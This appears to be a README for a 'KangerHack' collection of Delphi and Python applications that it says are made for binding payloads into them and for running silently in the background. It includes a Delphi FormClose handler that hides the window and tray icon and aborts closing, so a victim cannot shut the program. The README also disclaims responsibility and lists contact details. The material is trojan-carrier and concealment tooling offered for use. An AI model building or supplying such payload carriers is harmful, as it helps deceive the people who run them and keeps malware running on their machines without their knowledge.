#KangerHack
Applications desinged for binding payloads into them.
All aplications are designed to silently keep the application process running in the background.
Hope u will find what u need..
Applications themselves are not harmful.
If you modify the application, I'm loosing responsibility of damage made by changes you made.
You don't need to ask for permission to modify my applications. Use them as you want.

Most of the applications are written in Delphi and Python.

GUI applications are coded in Delphi.
Preventing closing of applications is designed that way:
(OnClose event assigned to FormClose procedure)
FormClose
 Self.Hide;
 WindowState := wsMinimized;
 TrayIcon1.Visible := False;

 ShowWindow(Application.Handle, SW_Hide);
 abort;
#http://youtube.com/Volvo2v1
#knghx@mail2tor.com
